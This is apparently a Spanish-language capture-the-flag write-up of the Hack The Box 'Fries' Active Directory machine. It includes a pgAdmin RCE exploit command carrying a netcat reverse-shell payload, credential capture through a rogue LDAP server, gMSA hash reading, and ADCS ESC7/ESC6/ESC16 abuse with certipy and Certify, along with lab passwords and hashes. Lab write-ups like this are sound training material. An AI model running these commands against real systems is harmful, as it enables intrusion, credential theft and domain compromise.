---
title: "Fries ⭐"
---

# Fries ⭐

#htb #windows #ActiveDirectory #adcs #esc7 #esc16 #gmsa #winrm #writeup


<img src="/images/pasted-image-20260617112506.png" alt="Pasted image 20260617112506">

```
start_auth fries.htb 10.129.244.72 d.cooper 'D4LE11maan!!'
```

Tratamos de loguearnos usando las credenciales por smb, ldap y kerberos sin éxito.

Encontramos dos webs, una en el puerto 80 y otra en el 443.

Ademas hay un [Gitea](/network-pentest/extras/cms/gitea) en `code.fries.htb`

```bash
ffuf -u http://fries.htb -H "Host: FUZZ.fries.htb" -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt  -mc all -ac -t 150
```

<img src="/images/pasted-image-20260618164332.png" alt="Pasted image 20260618164332">

Encontramos usuarios

<img src="/images/pasted-image-20260618164737.png" alt="Pasted image 20260618164737">

La versión no tiene vulns interesantes

<img src="/images/pasted-image-20260618164942.png" alt="Pasted image 20260618164942">

Tratamos de fuzzear esta

```bash
gobuster dir -u http://fries.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -t 150 -k --no-error
```

<img src="/images/pasted-image-20260618165337.png" alt="Pasted image 20260618165337">

Tenemos más nombres de usuarios

<img src="/images/pasted-image-20260618165554.png" alt="Pasted image 20260618165554">

<img src="/images/pasted-image-20260618170129.png" alt="Pasted image 20260618170129">

Solo queda la que es por https

Hay una notificación que dice que la aplicación está en modo configuración y que no te puedes loguear

<img src="/images/pasted-image-20260618170308.png" alt="Pasted image 20260618170308">

Al loguearse recibimos este error

Parece que una cuenta de servicio está haciendo estas peticiones.

<img src="/images/pasted-image-20260618170824.png" alt="Pasted image 20260618170824">

PWN: Password Web Manager , se trata de un servicio de gestión de contraseñas con ldap.

<img src="/images/pasted-image-20260618173032.png" alt="Pasted image 20260618173032">

El problema es que necesitamos una contraseña para acceder al panel de configuración

Y si tratamos de bruteforcearla

<img src="/images/pasted-image-20260618175309.png" alt="Pasted image 20260618175309">

Nos loguemos en el gitea con 

```
d.cooper@fries.htb \ D4LE11maan!!
```

Tenemos el código fuente de la landing en un repo

```bash
git clone http://code.fries.htb/dale/fries.htb.git
```

Buscamos cosas en el repo

```bash
git diff --cached
```

```bash
git log --oneline --graph --all
```

Hacemos un diff entre primer y último commit

```bash
git diff be59cce 47b29c4
```

Y parece ser que se subió un `.env`

<img src="/images/pasted-image-20260618183617.png" alt="Pasted image 20260618183617">

```
-DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
-SECRET_KEY=y0st528wn1idjk3b9a
```

Intentamos loguearnos por SSH con esas creds.

Vamos a hacernos un listado de posibles usuarios con los encontrados

```bash
/opt/kerbrute/kerbrute_linux_amd64 userenum --dc 10.129.244.72 -d fries.htb users.txt
```

<img src="/images/pasted-image-20260618190829.png" alt="Pasted image 20260618190829">

Encontramos un subdominio

<img src="/images/pasted-image-20260619115023.png" alt="Pasted image 20260619115023">

Entramos con las creds de `d.cooper`
Y para acceder al servidor de fries metemos las creds previamente encontradas.

<img src="/images/pasted-image-20260619115800.png" alt="Pasted image 20260619115800">

[Buscamos en las tablas de las DBs](/network-pentest/extras/cms/pgadmin)

Podemos hacer RCE desde una consulta


<img src="/images/pasted-image-20260619121404.png" alt="Pasted image 20260619121404">

La versión es vulnerable a RCE

<img src="/images/pasted-image-20260619122850.png" alt="Pasted image 20260619122850">

https://github.com/Cycloctane/cve-2025-2945-poc/blob/main/exp.py

```bash
python3 exp.py --target-url http://db-mgmt05.fries.htb:80 --username 'd.cooper@fries.htb' --password 'D4LE11maan!!' --db-user 'root' --db-pass 'PsqLR00tpaSS11' --db-name 'gitea' --payload "__import__('os').system('ping 10.10.14.131')" --skip-version-check
```

```bash
python3 exp.py --target-url http://db-mgmt05.fries.htb:80 --username 'd.cooper@fries.htb' --password 'D4LE11maan!!' --db-user 'root' --db-pass 'PsqLR00tpaSS11' --db-name 'gitea' --payload "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.131 4444 >/tmp/f')" --skip-version-check
```

<img src="/images/pasted-image-20260619125940.png" alt="Pasted image 20260619125940">

Podemos conectarnos por ssh

```
svc \ Friesf00Ds2025!!
```

Tiene toda la pinta de que estamos en una NAT con el DC en la `192.168.100.2` , seguramente sea una máquina virtual donde se corren todos los dockers.

<img src="/images/pasted-image-20260619131236.png" alt="Pasted image 20260619131236">

Está abierto el puerto 2049 y el 111 [NFS](/network-pentest/pentest-by-ports/111-2049-nfs)

<img src="/images/pasted-image-20260619154110.png" alt="Pasted image 20260619154110">

La escalada es viable de unas cuantas formas

<img src="/images/pasted-image-20260620175312.png" alt="Pasted image 20260620175312">

<img src="/images/pasted-image-20260620175406.png" alt="Pasted image 20260620175406">

Usamos copy fail para escalar

🔗 https://github.com/Juguitos/copy-fail.git

```bash
cat /root/user.txt 
```

Modificamos la política del broker para bypassear el error

<img src="/images/pasted-image-20260620181118.png" alt="Pasted image 20260620181118">

Añadimos esta línea

```json
{"name":"allow_local_root","users":[""],"actions":[""]}
```

El único docker del que no sabemos nada es el de PWN

<img src="/images/pasted-image-20260620181248.png" alt="Pasted image 20260620181248">

Podemos abrirnos una shell

```bash
docker exec -it f427ecaa3bdd /bin/bash
```

La configuración de PWN se suele encontrar así

```bash
find / -name "*PwmConfiguration*" 2>/dev/null
```

Nos pasamos los dos archivos de configuración a la máquina

Encontramos el hash de la contraseña de la página de configuración

```bash
cat PWM-backup.xml| grep config
```

<img src="/images/pasted-image-20260620183359.png" alt="Pasted image 20260620183359">

```
rockon!
```

Una vez dentro del config manager podemos intentar descifrar la pass del usuario `svc_infra`

Pero también podemos cambiar el servidor ldap a nuestro servidor en texto plano y encender el responder

ldap://10.10.14.131:389

Veremos credenciales en texto plano

<img src="/images/pasted-image-20260620191939.png" alt="Pasted image 20260620191939">

```
svc_infra \ m6tneOMAh5p0wQ0d
```

Podemos leer la pass de `GMSA_CA_PROD$`

<img src="/images/pasted-image-20260620193012.png" alt="Pasted image 20260620193012">

```
GMSA_CA_PROD$ \ 5710cd97225e920cdc6badc919fc8c51
```

Tenemos acceso por winrm al DC

<img src="/images/pasted-image-20260620193221.png" alt="Pasted image 20260620193221">

```bash
certipy find -vulnerable -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.244.72
```

ADCS es vulnerable a [ESC7](/network-pentest/privilege-escalation/active-directory/ad-certificate-services) , como podemos observar `GMSA_CA_PROD$` tiene `ManageCa`

<img src="/images/pasted-image-20260620193951.png" alt="Pasted image 20260620193951">

```bash
certipy ca -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.25.115 -ca 'fries-DC01-CA' -add-officer 'GMSA_CA_PROD$'
```

Habilitamos la plantilla SubCA

```bash
certipy ca -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.25.115 -ca 'fries-DC01-CA' -enable-template 'SubCA'
```

Solicitamos la creación del certificado usando la plantilla, esto nos tira permission denied

```bash
certipy req -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.25.115 -ca 'fries-DC01-CA' -template 'SubCA' -upn 'administrator@fries.htb'
```

Intentamos aprobar la creación del certificado, nos tira permiso denegado

```bash
certipy ca -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.25.115 -ca 'fries-DC01-CA' -issue-request '1'
```

Vamos a probar con `certify.exe`

```bash
evil-winrm -i 10.129.25.115 -u 'GMSA_CA_PROD$' --hash '5710cd97225e920cdc6badc919fc8c51'
```

Según la guía de Certify para ESC7 podemos habilitar ESC6, ESC11 y ESC16 aprovechando que tenemos ManageCA

🔗 https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques

```bash
.\Certify.exe manage-ca --ca 'DC01.fries.htb\fries-DC01-CA' --esc6
```

<img src="/images/pasted-image-20260621204357.png" alt="Pasted image 20260621204357">

Ahora si filtramos

```bash
.\Certify.exe enum-cas --ca 'DC01.fries.htb\fries-DC01-CA' --filter-vulnerable --hide-admins
```

<img src="/images/pasted-image-20260621204640.png" alt="Pasted image 20260621204640">

Intentamos explotar ESC6 por separado

El problema que tenemos es que  `GMSA_CA_PROD$` no puede configurar la CA ni puede apuntarse en la plantilla de usuario porque no lo es.

```bash
certipy ca -u 'GMSA_CA_PROD$' -hashes ':5710cd97225e920cdc6badc919fc8c51' -dc-ip 10.129.244.72 -ca 'fries-DC01-CA' -add-officer 'svc_infra'
```

Habilitamos ESC6 y ESC16

```bash
.\Certify.exe manage-ca --ca 'DC01.fries.htb\fries-DC01-CA' --esc6
```

```bash
.\Certify.exe manage-ca --ca 'DC01.fries.htb\fries-DC01-CA' --esc16
```

Y ejecutamos ESC6 como el usuario `svc_infra`

<img src="/images/pasted-image-20260622123709.png" alt="Pasted image 20260622123709">
